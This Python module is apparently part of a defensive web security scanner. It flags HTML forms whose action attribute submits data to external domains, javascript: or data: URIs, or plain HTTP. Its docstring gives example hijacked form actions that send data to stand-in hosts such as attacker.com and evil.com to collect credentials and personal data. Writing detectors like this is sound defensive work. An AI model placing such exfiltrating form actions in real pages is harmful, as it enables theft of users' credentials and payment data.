"""
Form Action Hijacking Security Scanner.

HTML forms with action attributes pointing to external or untrusted domains
can exfiltrate form data (credentials, PII, payment info) to attacker-controlled
endpoints. Security issues:

1. Cross-origin form action:
   - `<form action="https://attacker.com/collect">` — form data submitted to
     an external domain, bypassing same-origin protections.
2. Relative protocol form action:
   - `<form action="//evil.com/collect">` — protocol-relative, inherits
     current scheme (HTTPS/HTTP), always sends to external domain.
3. Forms with sensitive inputs pointing outside the origin:
   - Password fields, credit card fields, SSN fields in forms that POST to
     external endpoints are a direct data exfiltration path.
4. Form action pointing to HTTP (not HTTPS):
   - `<form action="http://example.com/login">` on an HTTPS page sends
     credentials in plaintext (mixed content POST).
5. JavaScript form action injection:
   - `<form action="javascript:...">` — executes JS when form is submitted;
     can bypass CSP if unsafe-inline is present.
6. Data URI form action:
   - `<form action="data:text/html,...">` — unusual; may be used to exfiltrate
     data to a local page or bypass security controls.

CWE-20: Improper Input Validation
CWE-601: URL Redirection to Untrusted Site
CWE-312: Cleartext Storage of Sensitive Information
"""

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, urljoin

from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_warn, log_fail

logger = get_logger(__name__)

_FORM_RE = re.compile(r'<form\b((?:[^>"\'\\]|"[^"]*"|\'[^\']*\')*?)>', re.I)
_ACTION_RE = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.I)
_METHOD_RE  = re.compile(r'\bmethod\s*=\s*["\'](\w+)["\']', re.I)
_INPUT_PASSWORD_RE = re.compile(
    r'<input\b[^>]+type\s*=\s*["\']password["\']', re.I
)
_INPUT_SENSITIVE_RE = re.compile(
    r'<input\b[^>]+(?:name|id)\s*=\s*["\'](?:'
    r'(?:card[_-]?number|cc[_-]?num|credit[_-]?card|cvv|cvc|ssn|'
    r'social[_-]?security|bank[_-]?account|routing[_-]?number|'
    r'tax[_-]?id|passport|driving[_-]?licen)[^"\']*)["\']',
    re.I
)
_JS_ACTION_RE    = re.compile(r'^javascript:', re.I)
_DATA_URI_RE     = re.compile(r'^data:', re.I)
_RELATIVE_PROTO  = re.compile(r'^//', )


def _is_external(action: str, base_host: str) -> bool:
    """Return True if action URL points to a different host than base_host."""
    if not action or action.startswith("#") or action.startswith("?"):
        return False
    if _JS_ACTION_RE.match(action) or _DATA_URI_RE.match(action):
        return False
    if _RELATIVE_PROTO.match(action):
        parsed = urlparse("https:" + action)
        return parsed.netloc.lower().lstrip("www.") != base_host.lstrip("www.")
    if action.startswith("/"):
        return False
    parsed = urlparse(action)
    if parsed.scheme and parsed.netloc:
        return parsed.netloc.lower().lstrip("www.") != base_host.lstrip("www.")
    return False


class FormActionHijackingScanner(BaseScanner):
    """Detect forms with external/hijackable action attributes."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []
        findings = 0

        try:
            resp = self.http.get(url)
        except Exception:
            return self.results

        if resp is None:
            self.results.append(self._result(
                url, "Form action hijacking — no response", "PASS",
                detail="Target did not respond."
            ))
            return self.results

        body = resp.text or ""
        base_host = urlparse(url).netloc.lower()
        forms = _FORM_RE.findall(body)

        if not forms:
            log_pass(logger, f"No forms found at {url}")
            self.results.append(self._result(
                url, "Form action hijacking — no forms found", "PASS",
                detail="No HTML form elements detected on this page."
            ))
            return self.results

        for form_attrs in forms:
            if findings >= 8:
                break

            action_m = _ACTION_RE.search(form_attrs)
            action   = action_m.group(1).strip() if action_m else ""
            method_m = _METHOD_RE.search(form_attrs)
            method   = (method_m.group(1).upper() if method_m else "GET")

            if _JS_ACTION_RE.match(action):
                log_warn(logger, f"JavaScript form action at {url}: {action[:80]}")
                self.results.append(self._result(
                    url,
                    f"Form action hijacking — javascript: action URI: {action[:80]}",
                    "WARN",
                    detail=(
                        f"A form has action='javascript:...'. When submitted, this executes "
                        "arbitrary JavaScript. If combined with unsafe-inline CSP, this is "
                        "an XSS vector. Fix: use event handlers (onsubmit) instead of "
                        "javascript: URI in form action."
                    )
                ))
                findings += 1
                continue

            if _DATA_URI_RE.match(action):
                log_warn(logger, f"Data URI form action at {url}: {action[:80]}")
                self.results.append(self._result(
                    url,
                    f"Form action hijacking — data: URI in form action",
                    "WARN",
                    detail=(
                        "A form has action='data:...'. Data URI form actions are unusual "
                        "and may be used to bypass security controls or exfiltrate data. "
                        "Fix: use explicit HTTPS URLs for form actions."
                    )
                ))
                findings += 1
                continue

            if action and _is_external(action, base_host):
                has_password = bool(_INPUT_PASSWORD_RE.search(body))
                has_sensitive = bool(_INPUT_SENSITIVE_RE.search(body))

                if has_password or has_sensitive:
                    log_fail(logger, f"Sensitive form submits to external domain at {url}: {action[:80]}")
                    self.results.append(self._result(
                        url,
                        f"Form action hijacking — sensitive form submits to external domain: {action[:80]}",
                        "FAIL",
                        detail=(
                            f"A form containing password or sensitive input fields has action='{action}', "
                            f"which points to a different domain. Form data (including credentials or PII) "
                            "will be submitted cross-origin to an external server. "
                            "Fix: ensure form actions only point to trusted, same-origin endpoints."
                        )
                    ))
                else:
                    log_warn(logger, f"Form submits to external domain at {url}: {action[:80]}")
                    self.results.append(self._result(
                        url,
                        f"Form action hijacking — form submits to external domain: {action[:80]}",
                        "WARN",
                        detail=(
                            f"A form has action='{action}', submitting to a different domain. "
                            "Cross-origin form submission may be intentional (e.g., payment "
                            "processors) or may indicate form hijacking. "
                            "Fix: verify this is an intentional cross-origin submission to a "
                            "trusted service (Stripe, PayPal, etc.)."
                        )
                    ))
                findings += 1
                continue

            if action and not _is_external(action, base_host):
                full_action = urljoin(url, action)
                if full_action.startswith("http://") and url.startswith("https://"):
                    log_warn(logger, f"Form action downgrade HTTP on HTTPS page at {url}")
                    self.results.append(self._result(
                        url,
                        f"Form action hijacking — HTTP action on HTTPS page (mixed content POST)",
                        "FAIL",
                        detail=(
                            f"Form action='{action}' submits to HTTP from an HTTPS page. "
                            "The form data (including passwords or session tokens) will be "
                            "sent in plaintext over an unencrypted connection (mixed content POST). "
                            "Fix: change the form action URL to use HTTPS."
                        )
                    ))
                    findings += 1

        if not self.results:
            log_pass(logger, f"No form action hijacking issues at {url}")
            self.results.append(self._result(
                url, "Form action hijacking — all forms use same-origin HTTPS actions", "PASS",
                detail="No forms with external, javascript:, or HTTP action targets detected."
            ))

        return self.results
